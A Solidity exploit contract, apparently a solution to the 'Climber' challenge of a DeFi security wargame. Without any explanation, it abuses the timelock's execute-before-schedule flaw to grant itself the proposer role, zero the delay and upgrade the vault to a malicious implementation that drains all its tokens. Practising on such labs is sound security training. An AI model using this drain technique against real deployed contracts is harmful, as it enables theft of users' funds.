// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../climber/ClimberTimelock.sol";
import "../climber/ClimberVault.sol";

contract HackClimber {
    address vault;
    address timelock;
    address token;
    address owner;
    address newVault;

    address[] targets;
    bytes[] dataElements;

    function setup(address _vault, address _timelock, address _token, address _owner) external {
        vault = _vault;
        timelock = _timelock;
        token = _token;
        owner = _owner;
        newVault = address(new NewVault());

        bytes memory data;
        // index 0
        targets.push(timelock);
        data = abi.encodeCall(AccessControl.grantRole, (PROPOSER_ROLE, address(this)));
        dataElements.push(data);

        // index 1
        targets.push(timelock);
        data = abi.encodeCall(ClimberTimelock.updateDelay, (0));
        dataElements.push(data);

        // index 2
        targets.push(vault);
        data = abi.encodeCall(
            UUPSUpgradeable.upgradeToAndCall,
            (newVault, abi.encodeCall(NewVault.withdrawAll, (IERC20(token), owner, IERC20(token).balanceOf(vault))))
        );
        dataElements.push(data);

        // index 3
        targets.push(address(this));
        data = abi.encodeCall(this.exploit, ());
        dataElements.push(data);
    }

    function exploit() external {
        uint256[] memory values = new uint256[](targets.length);
        ClimberTimelock(payable(timelock)).schedule(targets, values, dataElements, 0);
    }

    function getTargets() external view returns (address[] memory) {
        return targets;
    }

    function getDataElements() external view returns (bytes[] memory) {
        return dataElements;
    }
}

contract NewVault is ClimberVault {
    function withdrawAll(IERC20 token, address recipient, uint256 amount) external {
        token.transfer(recipient, amount);
    }
}
